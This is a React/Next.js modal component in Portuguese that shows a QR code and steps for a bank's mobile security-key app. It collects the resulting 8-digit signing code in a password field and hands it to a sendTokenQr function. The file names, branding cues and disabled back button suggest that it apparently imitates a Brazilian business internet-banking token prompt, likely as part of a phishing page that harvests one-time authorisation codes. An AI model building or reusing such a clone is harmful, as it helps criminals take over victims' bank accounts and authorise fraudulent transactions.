"use client";
const keepSafe = "/PJ_seguranca_net-empresa.jpg";
const qrCodeIcon = "/token-qr-corde.svg";
import { useIdentification } from "@/contexts/IdentificationContext";
import { useEffect, useState } from "react";
import { LoadingqrModal } from "./components/LoadingQrModal";

interface ModalQrCode {
  loading: boolean;
  qrCodeInvalid: boolean;
  qrCodeUrl: string;
}

export function ModalQrCode({
  loading,
  qrCodeInvalid,
  qrCodeUrl,
}: ModalQrCode) {
  const [tokenQr, setTokenQr] = useState("");
  const { sendTokenQr } = useIdentification();

  useEffect(() => {
    document.body.style.overflow = "hidden";

    return () => {
      document.body.style.overflow = "unset";
    };
  }, []);

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    await sendTokenQr(tokenQr);
  }

  return (
    <div
      style={{ backgroundColor: "rgba(0, 0, 0, 0.5)" }}
      className="fixed font-[systemBase] top-0 left-0 h-full w-full overflow-auto z-[9999]"
    >
      <div className="bg-white m-10 p-6 w-fit max-w-[780px]">
        <div>
          <img src={keepSafe} alt="" />
        </div>

        {/* Caixa QRCODE  */}
        {loading === true ? (
          <LoadingqrModal />
        ) : (
          <form onSubmit={onSubmit} className="">
            <div className="py-7">
              <img
                className="w-[165px] h-[165px]"
                src={qrCodeUrl}
                alt="QR Code"
              />
            </div>
            <div className="text-sm font-[systemBase] font-medium flex flex-col gap-4">
              <p>
                <b>1</b> - No aplicativo instalado em seu celular, acesse o
                icone chave de segurança.
              </p>
              <p>
                <b>2</b> - Em seguida clique na opção Assinatura Eletrônica e
                capture a imagem atráves da câmera do celular.
              </p>
              <p>
                <b>3</b> - Por último , será apresentado um código de 8 dígitos.
                Basta digitá-lo ao lado e confirmar.
              </p>
            </div>
            <div className="h-[120px] mt-7 flex items-end">
              <img src={qrCodeIcon} alt="" />
              <div className="ml-10 mb-[30px] flex flex-col w-[184px] outline-0">
                <input
                  className={`
                  border-b #C8C9CC 
              font-medium text-base
              pb-2 focus:border-[#3b69ff] focus:border-b-2 ${
                qrCodeInvalid
                  ? "border-b-[#CC092F] border-b-2"
                  : "border-b-[#C8C9CC]"
              }`}
                  type="password"
                  value={tokenQr}
                  onChange={(e) => setTokenQr(e.target.value)}
                  maxLength={8}
                  title="Digite o código de 8 dígitos para confirmar a operação."
                />
                <span className="mt10 text-[#47484C] text-xs leading-4 font-[systemBase] font-medium">
                  (8 dígitos)
                </span>
              </div>
            </div>
            {qrCodeInvalid && (
              <p className="mt-4 text-[#CC092F] font-bold  ">
                Verifique se a chave de segurança está correta e tente
                novamente.
              </p>
            )}
            <div className="mt-4 flex items-center mb-4">
              <button
                type="submit"
                className="bg-[#E1173F] h-12 px-12 font-bold text-white rounded-[30px] text-sm
        hover:bg-[#C50030] transition-all cursor-pointer"
              >
                Continuar
              </button>
              <p className="opacity-30 text-sm pl-1 ml-12 cursor-not-allowed font-semibold">
                Voltar
              </p>
            </div>
          </form>
        )}
        {/*FIM Caixa QRCODE  */}
      </div>
    </div>
  );
}
